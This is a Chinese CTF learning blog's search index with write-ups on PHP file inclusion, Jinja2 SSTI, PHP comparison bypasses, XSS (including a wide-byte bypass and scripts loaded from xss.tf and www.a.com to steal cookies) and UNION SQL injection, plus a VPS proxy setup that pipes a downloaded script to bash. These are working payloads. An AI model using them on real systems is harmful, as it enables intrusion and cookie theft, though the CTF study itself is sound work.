<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[PHP利用文件包含漏洞]]></title>
    <url>%2F2019%2F04%2F15%2FPHP%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[这是一道文件包含漏洞的题目。 简单介绍一下文件包含，文件包含简单来说就是在一个文件里面引入另一个文件。拿最通俗的C语言来说，1#include &lt;stdio.h&gt; 这就是最简单的文件包含，编一阶段编译器会把stdio.h直接包含进来。 PHP提供了四种包含方式，分别是include(),include_once(),require()和require_once()。这四个都可以进行文件包含，但有区别 require 找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本。 include 找不到被包含的文件时只会产生警告(E_WARNING)，脚本继续执行。 include_once 此语句和include雷系，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含。 require_once 此语句和require类似，唯一区别就是如果该文件中的代码已经被包含。则不会再次包含。 如果是静态的文件包含几乎不会出问题，但是如果文件包含是动态的比如 1include($_GET[&apos;&apos;flie&apos;]) 这样裸露的包含外部文件很容易造成恶意代码的注入。题目 这道题是基础的文件包含题目所以不是很难，从题目可以很清楚的看到页面利用了文件包含来实现页面跳转，而我们要的flag文件应该就包含在flag.php里面，我们要做的就是从flag.php源码里面读出来。 由于我们需要的是获取源码而不是运行flag.php这个文件，所以我们需要访问本地文件，在此顺便补充一下。 PHP文件包含分为两种，一种是本地文件包含，它是通过浏览器包含web服务器上的文件，显然本题目是本地文件包含漏洞。 第二种是远程文件包含，它允许包含远程服务器上的文件，这就允许黑客上传远端payload。这种包含需要确定PHP是否开启远程包含选项 在php.ini文件中修改1allow_url_include=Off //把Off改为On 由于是PHP页面我们可以使用PHP的方法来获取flag的源码。这里使用的是PHP封装协议（伪协议）。PHP封装协议就是一些内置的URL风格的封装协议。 常用的有123456789101112file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流 我们要获取的是流文件，因此我们选用php:// ，同时我们需要一个过滤器filter来过滤数据流。因为流里面的数据很多，我们需要过滤出flag.php的数据。 所以构造代码1php://filter/resource=flag resource参数指定目标文件。同时我们需要read参数来读取文件，这里值得注意的是，文件包含对文件的后缀名并不关心，比如我的文件叫flag.txt ，但是里面使用了合法的盘后票语句，那么read进来以后浏览器依然会把它作为php文件执行，而不是读取内容。哪怕换成.jpg也一样。 所以在获取php文件的时候要进行base64编码，不然会被执行。 所以最终我构造的代码是 1php://filter/read=convert.base64-encode/resource=flag 得到一串编码 解码之后]]></content>
  </entry>
  <entry>
    <title><![CDATA[图灵]]></title>
    <url>%2F2019%2F04%2F14%2F%E5%9B%BE%E7%81%B5%2F</url>
    <content type="text"><![CDATA[搞了一天多博客 总算基本 把bug都弄好了 ，机器人 也弄山来了，但是跨域问题 影响了API接入，目前还是个小傻子。。。明天应该就能完成了，把之前的坑填了。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[19-4-13]]></title>
    <url>%2F2019%2F04%2F13%2F19-4-13%2F</url>
    <content type="text"><![CDATA[更换了模板 存在一些bug还未完全修复 暂时无法更新带图片的博客。。。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Success]]></title>
    <url>%2F2019%2F04%2F12%2FSuccess%2F</url>
    <content type="text"><![CDATA[1000分纪念一下。]]></content>
  </entry>
  <entry>
    <title><![CDATA[随笔-19-04-12]]></title>
    <url>%2F2019%2F04%2F12%2F%E9%9A%8F%E7%AC%94-19-04-12%2F</url>
    <content type="text"><![CDATA[停了一天电，刚才发文的时候发现图床又炸了，准备用hexo的静态关联了。一会修复图片问题。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSTI服务端模板注入]]></title>
    <url>%2F2019%2F04%2F12%2FSSTI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[题目：Confusion 1**这道题目名字就叫 “困惑”，乍一看确实让人困惑，整个界面就是一张图片还有两个跳转，两个跳转还都是404。但其实有不是那么困惑，因为题目里写了QCTF2018。。。 以下是我整个解这道题的完整过程，由于题目说明里面提示图片很关键，我首先查看的是图片，我知道Python是蛇的意思，所以我认为这道题必然牵扯Python。F12看到似乎没啥特别，下载下来看一下，因为我知道有些线索可能写在了图片属性里面，或者图片加密。似乎并无异样。用binwalk跑了一下也没有发现结果。由于知识有限并不清楚还有什么其它图片利用方法，于是我决定先把眼光转向其它线索，题目还提示要找到input的地方。我观察了一下主页面的HTML代码发现并没有被设置为“hidden”的隐藏input标签。 然而在检查login.php的404的时候发现代码里有线索。看来这个文件里面应该是有我们需要的flag。并访问不了。我猜测这个404页面可能做了伪装，虽然题目说了“Scanner is useless”。但是我还是决定用kali扫一下。当然结果肯定是没有什么有用的发现。（我的kali在U盘上，用的是live模式不好截图就不放出来了）。 我猜测会不会这个页面隐藏了GET参数，可以用来登录之类的。我尝试给比较常见的变量名“user”传递一个值看看有什么反应。没什么反应。感觉有点手足无措，想到之前已经做过XSS和SQL注入的题了，应该不会用XSS来做，但是我决定还是试一下。输入 1&lt;script&gt;alert(1)&lt;/script&gt; 出乎意料的竟然执行了。尝试 123456&lt;script&gt;Var fso=new ActiveXObject(Scripting.FileSystemObject); Var f=fso.opentextfile(“http://example.com/opt/flag_example.txt”,1，true); s = f.ReadAll(); document.write(s);&lt;/script&gt; 可以看到网站非常“委婉”的提示我们不要这么做。不过也就是说这么做也可以但是这里不提倡，之前做XSS的时候我就浏览过一些如何绕过这种弹窗保护机制，我觉得应该有可行之处，但是我还是希望能够按照正规步骤做题。 最终限于知识贫乏我只能去搜一下QCTF的内容。竟然在里面发现了原题！！ 把源码粘上去发现，好了本文结束，这道题目具体做法就是搜一搜。 ~~那是不可能的。既然找到正确答案了我们就必须知其所以然。 首先我们一开始的工作方向是正确的，我们已经找到了input点。但是这里用到了一个之前没有用过的注入技术。SSTI服务端门模板注入。 SSTI网上的资料并不多，我查阅了自己的一些书籍，只在专门的web安全书籍（黑客攻防技术宝典（web篇））里面才有相关介绍，可能我查阅不够仔细这个内容在其它书里面只是涵盖在了某个专题里面。 SSTI是针对模板进行攻击的。来看一个PHP模板的例子。 什么是模板，为什么要使用模板？ 模板简单来说就是定义了一个通用的框架，但是框架里面的内容是动态解析的。比如 123&lt;html&gt;&lt;title&gt;&#123;%$cont%&#125;&lt;/title&gt;&lt;/html&gt; 我们定义了一个HTML框架里面包含一个title标签但是至于标签里面是什么，现在不知道。 至于这个cont什么时候去填充，有两种。前端渲染，后端渲染。 前端渲染就是服务器一股脑把信息给浏览器，浏览器对信息先解析成HTML代码在渲染。 后端渲染是服务端把信息解析好了直接发给浏览器，浏览器仅进行渲染工作。 譬如说我们上边的模板页面起名为“index.html”。后端执行 1$temp-&gt;display(&apos;index.html&apos;, array(&apos;cont&apos; =&gt; $_GET[&apos;title&apos;])); 这样页面的就变成“title”的值，比如是123，那么 123&lt;html&gt;&lt;title&gt;123&lt;/title&gt;&lt;/html&gt; 这令我想到了之前学习的织梦CMS。很显然，凡事用到用户输入的如果不加以处理必然会造成类似XSS的漏洞。题目来看的话这里必然存在后端渲染的漏洞。测试一下，输入 1&#123;&#123;7*7&#125;&#125; 前端显示49，这是因为服务端把7*7进行了运算，像PHP的Twig模板不仅可以进行表达式运算还能输出变量的值，也可以用注释符的办法看看能不能输出注释内容来判断是否存在漏洞。由此来看模板漏洞也是因为么有对用户输入过滤引起的。 不过看了答案之后还是省了很多步骤，比如那张图片暗示了Python，这里的404页面其实不是Apache+PHP的构架，也就是说这里使用的并不是PHP 诸如Twig的模板，而是Python Flask jinja2。 这样我们只需要了解Flask jinja2的用法就可以找到植入payload的方法。官文 http://docs.jinkan.org/docs/jinja2/ （其实不用看也可以因为只用到基本语法可以搜一下） 构造payload。构造payload使用到了Python的内建属性 官文 https://docs.python.org/2/library/stdtypes.html#file-objects由于我的Python还在起步阶段，在参考了大量资料后还是不能完全对这个payload进行最正确的解释（从做题到写文已经一天半了一直在看这个payload），这里给出我认为比较全的一个解释 转载 https://www.freebuf.com/articles/web/98928.html简单说一下我的理解就是我们需要用一个类型变量比如说一个空字符串，使用class来获取它的类型，并通过mro来获取对象的继承类。然后通过索引获取我们目标对象，再用subclass列出所有类，通过索引找到“file”类，有了“file”对象后就能使用read()来读取文件了。 所以payload代码是 1&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/flag.txt&apos;).read() &#125;&#125; 获得flag。 不过QCTF的答案还说到了过滤，虽然这道题目没有用到，但是说一下。 比如题目对class做了过滤的话，可以使用request.args来绕过。这个东西是flask模板里面用于获取GET参数的一个功能，所以我们可以吧class定义为字符串变量通过request.args来获取这样就绕过了过滤。 1&#123;&#123;&apos;&apos;[request.args.a][request.args.b][2][request.args.c]()[40](&apos;/flag.txt&apos;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read 这个思想类似于之前XSS使用的截取字符串构造 script 的思想。]]></content>
  </entry>
  <entry>
    <title><![CDATA[随笔-19-4-11]]></title>
    <url>%2F2019%2F04%2F11%2F%E9%9A%8F%E7%AC%94-19-4-11%2F</url>
    <content type="text"><![CDATA[今天连肝两道高分大题，第三道题刚好处于关键时期，如果做出来时间太晚了的话，就一早再发具体做法，先大致说一下。 第一道题 confusion 1 图片的意思是Python VS PHP 在任何一个404页面里面能看到备注提示 flag在哪。通过SSTI 可以解出来，注意伪装成PHP的Python。第二题 basicFIleinclude 通过伪造php协议可以读出来 flag.php的源码]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 漏洞]]></title>
    <url>%2F2019%2F04%2F10%2FPHP-%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[今天做了两道PHP漏洞利用的题目相比XSS和SQL简单不少。直接上题目。 题目一 意思很简单我们需要提交一个name变量一个password变量和一个test变量，用GET方式传输，并且test的MD5编码要等于’0’，name！=password，且name和password的SHA1是一样的。 第一个要求MD5=’0’的字符串，如果你想利用之前获取验证码的方法用代码去跑一个MD5等于’0’字符串是不可能的。这里就需要用到PHP的弱匹配特性。 ！=和==在php中属于弱匹配，它会先进行数据类型转换在进行匹配。而===的话呢就不会转换数据类型，类型不相等就直接false了。 利用数据转换这一特点，根据PHP手册的描述：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。其中0e是科学计数法，因为涉及到数字内容，所以就会转换为数值，而0e830400451993494058024219903391转换为数值也就是0*(10^830400451993494058024219903391) = 0，因此只需找到生成的MD5值类似0exxxxxxxxx的字符串即可。，如123456QNKCDZO240610708s878926199as155964671as214587387as214587387a 这些都是以’0E’开头的字符串。我们输入以下语句在URL里面1http://example.com/index.php?name=a&amp;password=b&amp;test=QNKCDZO 第一关搞定。 那么怎么实现name！=password但是两者的SHA1值又一样呢，SHA1相同的两个数据是存在的，但是想通过穷举的方式来找十分困难，所以目标变放在了sha1()，这个函数上。构造name！=password很简单。对于php的sha1()函数如果加密成功则返回加密后的字符串，反之返回NULL。那我们就想到能不能通过让两者都返回NULL就可以了，因为判断语句里面并没有检查返回结果是否为NULL。经过查询，sha1()不支持处理数组，那么我们只需要把name和password设置为数组就可以绕过了。1http://example.com/index.php?name[]=a&amp;password[]=b&amp;test=QNKCDZO 第二题 第二题要求在config.php里面写入脚本，其实只要把过滤字符 ‘&lt;’ , ‘php’ 写进去就行。 可以看到脚本使用stripos()方法对 ‘&lt;’ , ‘php’ 字符进行了过滤处理。按照之前做XSS的方法我想到可不可以使用转码的方式绕过检测，输入1&amp;lt 可以字符直接显示了出来，php直接把它处理成了纯文本放到了body里面，此法不通。 试着查阅stripos()的相关漏洞，发现多数都是使用了此方法返回的是字符串所在位置，是一个int型，如果恰好返回0也就是非法字符位于开头，就可以破坏诸如 !stripos()的判断方式。但是题目里面直接使用了is_int()进行判断，所以无法使用此方法。 其实，我在思考这道题目的时候有点绕弯路了，费了一番周折之后我才想到可以同第一题一样让stripos()返回一个错误。经查阅stripos()也无法处理数组且返回NULL。那话不多说直接1http://example.com/index.php?content[]=&lt;]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS 题目解析（下篇）]]></title>
    <url>%2F2019%2F04%2F10%2FXSS-%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-%EF%BC%88%E4%B8%8B%E7%AF%87%EF%BC%89%2F</url>
    <content type="text"><![CDATA[第三题：XSS 2 一样的题目，只不过xss.php文件不一样，直接点进去看看。这个页面你输入什么东西都会被转换成字符串无论是”、&lt;、&gt; 还是Unicode编码。可以发现敏感字符被转义了，Unicode被原样变换成了纯字符。 刚开始会有种手足无措的感觉，因为无论编码还是构造错误语法都没法突破。我决定按部就班从源头入手。先来搞清楚出题者是怎么实现这个转换功能的。既然是php文件我认为这个转换也是依靠的php。果然php中的addslashes()方法会把内容无脑转成字符串从而让恶意代码失效。那么就可以查阅一下怎样绕过addslashes()了。这里我只说一下本题的解法，各种绕过姿势详见https://bbs.ichunqiu.com/thread-10899-1-1.html我这里是用的是宽字节方法，简单说一下就是“錦“字gbk编码是0xe55c，utf-8编码是0xe98ca6。当php的iconv把它从UTF-8转成gbk的时候会被翻译为%e5%5c，而%5c就是“\”，当我们输入“\” 是iconv会把它转成转义字符 “\” 编码是%5c%5c ，那么如果这么输入“錦\”，iconv 便把它转换成了 %e5%5c%5c%5c,也就是“閷�\”,可以看到最后的\逃出来了，输入“ 錦” ”，输出“閷””.OK,成功闭合。这种方法类似于SQL注入。 但是我们还面临一个问题，如果我们按照之前的方法使用createElement()的方法的话我们必然会用到 ‘ ，但是会被转义，如果用汉字破坏转义又会留有乱码，createElement(閷�’閷�’).显然这是不正确的语法。 接下来的方法比较笨拙仅仅是我个人的做法，希望读者能找出更好地做法。为了大家方便实现提示一下，这个页面除了做了字符串转换以外，还过滤掉了“&lt;”和“+”这两个符号，以防大家白费功夫。不过如果你的思路实在需要这些符号后面我也会说一下如何提取这些符号。 我想到的办法是反利用它原本的的字符串转换。我们很清楚我们需要 123var s=document.createElement(&apos;script&apos;);document.body.appendChild(s);s.src=&quot;http://xss.tf/Vw6&quot;; 这段代码，但是这段代码，需要两个字符串，一个是标签名一个是地址名。恰好我们手里有一个现成的字符串变量a，没错，我的想法就是把要用到的字符串写到a变量里面然后截取。输入： 1scripthttp://xss.tf/Vw6錦&quot;;// 变量a里面已经写入了我们需要的代码，我们需要提取出来。 12345scripthttp://xss.tf/Vw6錦&quot;;var s=document.createElement(a.substr(0,6));document.body.appendChild(s);s.src=a.substr(6,17);// 通过substr()将需要的字符串截取了出来。提交一下看看。完成。想必你的XSS平台也已经提示你了。 接下来只需要把它放到URL里面让admin上钩即可。但是这里还是要把他们转换成encodeURIComponent（这里只需转一次，不用先转Unicode）。因为题目指定URL不允许使用汉字空格等。最后提交完成。最后附上如何强行使用被过滤的符号，拿 &lt; 来说，我的思路依然是使用 a 字符串变量。&lt; 的 encodeURIComponent 编码是%3c。也就是浏览器会把%3c解释为 &lt; 。那么我的思路就是不让浏览器解释我们自己来。我们再对%3c进行encodeURIComponent 编码得到%253c。我们把这个代码给URL看看会发生什么。得到了 %3c没有问题。接下来就需要我们自己转码了。同样使用substr()截取到%3c然后用decodeURI() 函数解码。小示范： 123%253c錦&quot;;alert(decodeURI(a.substr(0,3)));// 总结 先说几点提示：1、除了使用createElement()还可以用document.write()。但是后者的写入方式很迷，有时候会把你的数据当做字符串处理，而且需要用到转义字符，因为你的内容里面一定会有 ‘ 等标记部转译的话会发生错误。2、XSS平台提供了很多注入方式，比如构造图片等等，但是图片方式的载入速度要慢一些。有可能会失败，比如再做后两道题的时候，第一道使用图片完全没有问题，但是第二道却不行。并且第一道题在使用图片注入的时候，你并不能立即获得报告，你需要再随便点一次提交才可以获得报告，我猜想是，第一次admin把脚本给了xss.php但是图片并没有加载，再次提交的时候刚才能让图片载入。但是第二道题就完全不可以了。这个问题我需要在研究一下。3、如果你是用的是XSS Hunter做题的话，可能会因为延迟的问题导致你获取不到admin的cookies。因为它的服务器在海外，所以对js的访问速度要慢一些，可能会导致你抓包里面的内容不全。另外它的模块设置了如果你之前有它发送的邮件，它会自动把老邮件扔到垃圾箱，只保留最新的邮件。有一次因为漏写了 ; 导致代码反复运行发了50多封邮件给我，只能一个个查找哪个是admin发给我的。 总的来说XSS有点类似SQL注入，只不过这里用的是HTML、JS。虽然只是学习了初级阶段的内容但是还是非常有意思的。]]></content>
  </entry>
  <entry>
    <title><![CDATA[SQL 注入（UNION联合注入）]]></title>
    <url>%2F2019%2F04%2F09%2FSQL-%E6%B3%A8%E5%85%A5%EF%BC%88UNION%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%89%2F</url>
    <content type="text"><![CDATA[SQL注入原理上跟XSS接近，也是因为对用户的输入信息不做检查而导致的漏洞。比如有一个登录页面它不加检查的把用户输入信息放到SQL语句中。1SELECT * FROM users WHERE username = &apos;用户输入信息&apos; AND password = &apos;&apos;用户输入信息&apos; 如果我们输入的信息是 “admin’ –”1SELECT * FROM users WHERE username = &apos;admin&apos; -- AND password = &apos;&apos;用户输入信息&apos; 可以看到由于 ‘ 闭合了用户名称的查询使得 – 逃出，从而注释掉了 password的检查。成功使得admin账户登录。 由于SQL注入的方式有很多，这道题目我选择了UNION联合注入方式。题目目标页面是一个新闻页面，可以通过搜索栏查询新闻。 首先查看有无注入点，输入1&apos; 点击确定发现页面报错，说明存在注入点，写入的’影响了SQL语句的执行。 输入1&apos; -- 报错，输入1&apos; # 正常，可能页面设置了WAF把“–”字符屏蔽了，但是“#”注释可以使用，输入11&apos; OR 1=1 # 正常显示出所有新闻，1=1的结果恒成立，加上OR逻辑运算相当于对所有数据进行访问。继续输入11&apos; ORDER BY 1 # 没有报错，更改 ORDER BY 的数字，到4的时候报错，说明有3列。ORDER BY 是访问的数据按照第几列排序的意思，输入4的时候出错可见表格只有3列。列数可能比较多的时候推荐用二分法。 知道了有几列就可以使用UNION联合查询语句了。 UNION可以把两个查询语句的结果放在一起输出，比如1SELECT name,sex FROM user UNION SELECT month,day FROM date 显示结果是12张三 男2月 3日 之所以要获取表单列数，是因为UNION的使用前提是多次查询的列数必须保持一致，否则会报错。 由于我们不知道每一列的数据类型，因此我们可以使用可以随意转换类型的NULL类型来试探。1&apos; UNION SELECT NULL,NULL,NULL # 没问题，再试试1&apos; UNION SELECT &apos;a&apos;,NULL,NULL # 也没问题，看一下你的数据有没有在什么地方显示出来，如果没有继续试探。1&apos; UNION SELECT NULL,NULL,&apos;a&apos; # 试探到第三例的时候，发现查找内容显示在了页面内。那么就可以用这一位作我们的显示位，来查询的各种信息了。逐行输入下面的代码。1234567891011121314151617181920212223&apos; UNION SELECT NULL,NULL,@@version # // 数据库版本 &apos; UNION SELECT NULL,NULL,user() # // 用户信息&apos; UNION SELECT NULL,NULL,session_user()# // 当前用户&apos; UNION SELECT NULL,NULL,database()# // 数据库名称&apos; UNION SELECT NULL,NULL,@@datadir# /数据库路径&apos; UNION SELECT NULL,NULL,@@basedir# //数据库安装路径&apos; UNION SELECT NULL,NULL,@@version_compile_os# //操作系统// 使用group_concat()一次性显示： &apos; UNION SELECT NULL,NULL,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA # //获取所有数据库&apos; UNION SELECT NULL,NULL, (select group_concat(table_name) from information_schema.tables where table_schema=&apos;&apos;数据库名) # //数据库全部表名&apos; UNION SELECT NULL,NULL, (select group_concat(column_name) from information_schema.columns where table_schema=&apos;数据库名&apos; and table_name=&apos;表名&apos;) # //表的全部列名&apos; UNION SELECT NULL,NULL,列名 from 表名 # // 根据上面获取的 表名、列名查找信息 最终通过对获取的数据成功找到flag。]]></content>
  </entry>
  <entry>
    <title><![CDATA[VPS服务器搭建SSR/SS]]></title>
    <url>%2F2019%2F04%2F09%2FVPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS%2F</url>
    <content type="text"><![CDATA[实在是忍受不了国内博客论坛千篇一律的抄袭现象，决定去翻阅一下国外的资料。但又因为国内现成的VPN基本全被封杀，即便是有几个可以用的也会收费并且非常不稳定，于是决定自己动手打一个梯子。服务器：vultr（比较实惠、稳定的国外服务器）工具：xshell、shadowstocks、bbr、代理服务设置工具（下边会给出链接）首先是搞到服务器，去vultr注册账号。https://www.vultr.com/填写邮箱和密码，会给你发个邮件激活账号。先进性账户充值，充值最低10美元起。倒数2、3分别是微信和支付宝，扫码支付就可以了。 选择服务器选一个适合你的（延迟低的服务器）推荐日本和美国。如果不清楚哪个延迟低可以去这里测试一下http://ga-us-ping.vultr.com/ms越低越好。 选择系统和机器由于我使用kali较多所以我选了Debian，无特殊需求选默认的CentOS就可以了。机器的话如果仅仅用来fan墙，最便宜的就足够了。 后面的选项对此次的目的来说没有意义，因此全部采用的默认，具体功能自行了解。最后点击下方deploy now。 这样我们就有了一台自己的海外服务器。点击你的服务器进入详页可以看到你服务器IP和用户名、密码。后边会用到。下载xshell 链接：https://pan.baidu.com/s/11FRT_RPIVZjyvMkjx-zYbA 提取码：ffki安装完毕后新建连接。名字随意，主机号就是你申请的副武器的IP，端口一般默认22，可以自己修改。点击确定并连接主机。输入服务器的用户名密码。连接服务器。如图表示连接成功。 输入 1wget -N --no-check-certificate https://raw.githubusercontent.com/hombo125/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh 如果失败则先输入下面的指令再次运行上面的指令 1yum -y install wget 运行完成后出现如下提示，输入数字1安装ssr服务端输入端口和账号密码，端口的可选范围为60~65535。选择加密方式，输入对应数字即可，下面机几个操作的选择取决于个人，作者均采用默认设置。协议插件设置混淆（通过代理玩游戏推荐第一个速度快一些）设备限制空（回车）默认无限制，需要对访问速度加以限制的自己输入速率上限就行。下载文件安装完成后会显示相关信息，记得保存。若不慎关闭可以输入bash ssr.sh进入管理界面根据提示查看或者修改信息。重启服务器，可以再界面输入reboot也可以在你的vultr管理界面里重启。 安装BBR加速器，输入如下指令 123wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.shchmod +x bbr.sh./bbr.sh 按任意键安装。完成后提示重启服务器选择Y或手动重启。重启后输入lsmod | grep bbr查看是否安装成功。如上图安装成功。 下载代理设置工具 链接：https://pan.baidu.com/s/1_68i7TxfdT4lv3Kupge2wQ 提取码：z8jh 把之前保存的ssr配置信息填上。 设置浏览器的代理服务，地址127.0.0.1端口1080。使用全局模式所有浏览器就都可以使用代理服务了。Chrome可以使用自己的SwitchyOmega插件来定制自己的代理服务，但是这个插件的官方链接也被墙了，这里给出一个离线下载https://chrome-extension-downloader.com/。使用很简单实在不懂就Baidu一下吧。 至此vps服务器搭建ssr/ss就完成了，效果。]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS 随笔 02]]></title>
    <url>%2F2019%2F04%2F08%2FXSS%20%E9%9A%8F%E7%AC%94%2003%2F</url>
    <content type="text"><![CDATA[这两天一直肝到两点多才睡觉，今天终于搞完了实在是坚持不了了，就先写这一篇XSS简介吧，具体的攻击步骤明天再发吧！]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[什么是 XSS]]></title>
    <url>%2F2019%2F04%2F08%2F%E4%BB%80%E4%B9%88%E6%98%AFXSS%2F</url>
    <content type="text"><![CDATA[这几天一直在做CTF上的XSS题目，走了很多弯路，但是也学到了很多东西，这篇博文主要讲一下什么是XSS，下一篇讲说一下几道题目的做法。 XSS 简介 跨站脚本攻击：英文是Cross Site Script，本应缩写为 CSS，但是为了和层叠样式表有所区别所以在安全领域称之为 XSS 。XSS 攻击，通常指黑客通过“HTML 注入”篡改网页内容，插入恶意脚本，从而在客户浏览网页的时候，控制用户浏览器的一种攻击。简单来说就是黑客通过探测可以植入数据的地方如URL，文本框等的漏洞，来注入恶意HTML代码从而获取像cookies等重要信息，甚至更严重的危害。这一点十分类似于SQL 注入，只不过这里注入的是HTML和JS。此外XSS最早的案例是跨域的，但时至今日跨域这一特点已不在重要，但是XSS这个名字却一直延续至今。即便XSS长期位居Web安全的头号大敌，但是由于XSS破坏性强，且产生的原因复杂，很难以一次性解决，所以现今复杂的网络应用环境滋生着大量的XSS漏洞。 XSS 分类 第一种：反射型 XSS 反射型XSS是最简单的类型，是指简单地把用户数据“反射”给浏览器。也就是说，黑客往往需要诱导用户点击一个恶意练级，才能攻击成功。反射型 XSS也叫做 “非持久性 XSS” （Non-persistent XSS）。 1234567&lt;?php if(isset($_GET[&apos;name&apos;]))&#123; $text=$_GET[&apos;name&apos;]; echo &quot;&lt;div&gt;&quot;.$text.&quot;&lt;/div&gt;&quot; ; &#125; echo &apos;&lt;hr /&gt;&apos;; ?&gt; 这段代码不加检查的把用户输入信息打印出来，如果我们输入以下代码。 1http://www.a.com/a.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt; 代码被执行了，用户cookies被打印出来。第二种：存储型 XSS 存储型 XSS 会把用户输入的数据“存储”在远端服务器。这种 XSS 具有很强的稳定性。上边的例子中可以看出用户点击恶意链接之后弹出cookies对话框，但是远端的黑客并不知道。如果编写一段代码可以把获取的cookies发送到黑客的服务器或者邮箱上，就可以窃取用户cookies了。但是这种代码比较庞大不适合写成临时文件，如放在URL中会使得URL过长可能导致意想不到的错误，因此需要把代码事先写好，存在服务器上通过各种方式在客户端运行此代码。这种代码称为 XSS Payload。 1&lt;img src=x onerror=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://www.a.com/xss&apos;;&gt; 这段代码会生成一个实际并不存在的图片，图片地址里面包含了恶意代码的地址，这样代码便被浏览器执行了，客户信息将被事先编写的js获取并告知黑客。现如今互联网上遍布着各种公开的XSS Payload 模块，XSS 测试平台也很多，不想自己搭建的话可以直接使用，各平台大部分都是从GitHub上clone的大同小异，可以在项目管理界面实时查看成果。推荐一下国外的XSS Hunter ，这个平台可以把结果发送到你的邮箱，并且支持的注入方式很多，攻击模块也比较齐全，坏处就是国内访问延迟有点大，全英文会坑新人。有兴趣的话还是自己用kali搭个BeEF吧，谁用谁知道。 第三种：DOM Based XSS 实际上，这种类型的XSS并非按照“数据是否存储在服务器”来划分，DOM Based XSS 从效果上来说也是反射型XSS。只是因为其成因比较特殊，使用过修改页面的DOM节点来形成的XSS，称之为 DOM Based XSS。 12345678910&lt;script&gt;function fun()&#123; var str=document.getElementById(&quot;text&quot;).value; var d=document.getElementById(&quot;t&quot;).innerHTML=&quot;&lt;a herf=&apos; &quot;+str+&quot; &apos;&gt;link&lt;/a&gt;&quot;;&#125;&lt;/script&gt;&lt;div id=&quot;t&quot;&gt;&lt;/div&gt;&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;fun()&quot; /&gt; 页面根据用户的输入生成一个链接，由于没有进行合法性检查，所以可以输入以下代码。 1&apos; onclick=alert(document.cookie) // 点击链接用户信息被输出。这里用到了闭合的技巧会在下一篇博文中讲到。 这是关于XSS的简单介绍，下篇中会结合题目说一些XSS攻击方式。]]></content>
  </entry>
  <entry>
    <title><![CDATA[SVG 图片验证码解码]]></title>
    <url>%2F2019%2F04%2F08%2FSVG-%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E8%A7%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[环境：Python 3外部依赖：requests、bs4、BeautifulSoup、base64先看题目：题目类似于公式计算的那道题只是公式变成了图片验证码，所以关于爬虫和网页请求请看https://kkkiona.github.io/2019/04/05/Python%20%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95/下面是解题过程：查看网页代码是用SVG制作的图片并且采用了base64进行了加密。由于作者有一些canvas的使用经验，因此对SVG也有所了解，这里简单说一下。SVG是一种适量绘制技术，与HTML5的canvas技术相比最大的区别就是，canvas有与之关联的JavaScript API 但是SVG是通过xml来控制的。SVG的绘制质量运行速率也不如canvas，好处就是易于控制。后期我会发一篇详细的介绍。回归主题，把这个图片单独拿出来看一下就是这个样子，可以看到URL的base64后面跟了一大堆乱码，这就是加密的xml文档，F12可以看到解密以后的样子，当然也可以通过各种解密工具查看。那么我们就有两种思路，第一种就是像这样靠浏览器来解码然后抓解码后的内容，如果这么做就完全变成抓包游戏了，所以我更推荐第二种本地解码。先抓取题目的原始页面，然后通过简单的字符切割获取那段乱码字符串，方法见上面链接，这里只给出代码： 123response = requests.get(url)soup = BeautifulSoup(response.text, &quot;html.parser&quot;)src = soup.find(&quot;img&quot;).get(&quot;src&quot;).split(&apos;,&apos;)[1] 接下来重点就是解码，使用base64包解码。 12import base64enc = base64.b64decode(src) 可以把解码后的内容打印输出看一下，会发现跟浏览器的显示一样这里就不放图片了。下面的内容就很简单了，上方连接使用的关键字提取方法一样，只需要把text标签里面的内容提取出来组和并提交就可以了。但是结果会发现提交的结果是Wrong。仔细观察图片和浏览器里的解码后的代码会发现text中字符的排列顺序并不是想要的顺序，如上代码的前两个字符是D u 但是图片是t S。原来图片中的字符顺序是根据x轴的位置决定的，那么我们就需要对获取的文本重新排序了。 